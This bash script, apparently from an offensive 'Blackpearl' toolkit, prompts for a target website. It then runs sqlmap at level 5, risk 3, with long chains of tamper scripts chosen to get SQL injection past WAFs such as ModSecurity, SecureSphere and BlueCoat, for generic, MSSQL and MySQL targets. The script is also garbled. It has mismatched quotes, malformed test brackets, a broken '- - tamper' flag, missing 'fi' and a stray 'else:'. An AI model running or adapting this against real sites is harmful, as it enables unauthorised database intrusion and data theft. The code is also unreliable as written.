#!/bin/bash
echo -e "1.General tamper testing"
echo -e "2.MSSQL"
echo -e "3.Mysql"
echo
echo
read -p "Select an option :" ipp
read -p "Enter website :" w
echo
if [ $ipp == 1]
then
python sqlmap -u '$w’ --level=5 --risk=3 -p 'item1' - - tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
echo
read -p "Press enter to go back" enter 
bash waf.sh
fi
if [$ipp == 2]
then
python sqlmap -u '$w’ --level=5 --risk=3 -p 'item1' - - tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
echo
read -p "Press enter to go back" enter 
bash waf.sh 
if [$ipp == 3]
then 
python sqlmap -u '$w’ --level=5 --risk=3 -p 'item1 - - tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
echo
read -p "Press enter to go back" enter 
bash waf.sh 
echo
else:
cd Blackpearl-framework/lib
python sql.py 



